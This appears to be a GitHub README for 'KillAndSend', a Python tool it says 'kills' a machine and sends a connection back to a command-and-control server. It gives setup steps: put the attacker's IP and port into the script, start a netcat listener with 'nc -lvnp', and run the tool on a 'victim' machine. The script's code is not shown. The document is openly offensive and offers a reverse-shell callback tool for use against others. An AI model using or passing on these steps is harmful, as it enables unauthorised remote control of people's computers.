# KillAndSend
The python program for killing a machine and sending a connection back to C2 or command and control server

# Setting up
 open the file 
	root@liunx:# nano killandsend.py
		(or ant text editor)
on lines 
	6 host = "127.0.0.1"
	7 port = 8080

change the host and port 
	6 host = "Your_IP"
	7 port = port_number_for_nc

make sure to run netcat 
	nc -lvnp port_number_for_nc

# Usage
on the victimn machine 

![Screenshot from 2024-08-19 16-34-06](https://github.com/user-attachments/assets/ec24090d-459e-4fcb-8af0-c65357c0ce60)
